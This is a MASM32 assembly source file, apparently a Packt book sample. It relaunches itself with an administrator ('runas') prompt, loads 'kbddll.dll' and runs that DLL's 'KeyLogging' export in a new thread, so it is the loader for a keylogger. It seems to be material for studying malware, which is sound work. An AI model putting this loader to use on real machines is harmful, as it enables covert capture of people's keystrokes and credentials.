; «««««««««««««««««««««««««««««««««««««««««««««««««««««««««««««««««««««

      .486                      ; create 32 bit code
      .model flat, stdcall      ; 32 bit memory model
      option casemap :none      ; case sensitive

; «««««««««««««««««««««««««««««««««««««««««««««««««««««««««««««««««««««««««

;     include files
;     ~~~~~~~~~~~~~
      include \masm32\include\windows.inc
      include \masm32\include\masm32.inc
      include \masm32\include\shell32.inc
      include \masm32\include\user32.inc
      include \masm32\include\kernel32.inc
      include \masm32\include\msvcrt.inc
      include \masm32\macros\macros.asm

;     libraries
;     ~~~~~~~~~
      includelib \masm32\lib\masm32.lib
      includelib \masm32\lib\shell32.lib
      includelib \masm32\lib\user32.lib
      includelib \masm32\lib\kernel32.lib
      includelib \masm32\lib\msvcrt.lib
      
    .data
        dllname         db  "kbddll.dll", 0
        procName        db  "KeyLogging", 0
        szCaption       db  "Packt", 0
        szMsgFail       db  "Failed loading kbddll.dll.", 0
        szMsgSuccess    db  "Successfully loading kbddll.dll", 0
        hKlog           dd  0
        kprocaddr       dd  0
        
    .code

start:

; «««««««««««««««««««««««««««««««««««««««««««««««««««««««««««««««««««««

    call main
    invoke ExitProcess,eax

; «««««««««««««««««««««««««««««««««««««««««««««««««««««««««««««««««««««

main proc

    invoke GetCommandLine
    xchg eax, ebx
    .if sdword ptr find$(1, ebx, "-A") > 0
        jmp @f
    .else
        invoke ShellExecute, 0, chr$("runas"), ebx, chr$("-A"), 0, 0
    .endif
@@:
    invoke LoadLibrary, offset dllname
    mov hKlog, eax
    test eax, eax
    je load_fail
    invoke MessageBox, 0, offset szMsgSuccess, offset szCaption, MB_OK
    invoke GetProcAddress, hKlog, offset procName
    test eax, eax
    je free_lib

    invoke CreateThread, 0, 0, eax, 0, 0, 0
    test eax, eax
    je free_lib

    invoke WaitForSingleObject, eax, -1

free_lib:
    invoke FreeLibrary, hKlog
    jmp exit_main

load_fail:
    invoke MessageBox, 0, offset szMsgFail, offset szCaption, MB_ICONERROR

exit_main:
    ret

main endp

; «««««««««««««««««««««««««««««««««««««««««««««««««««««««««««««««««««««

end start
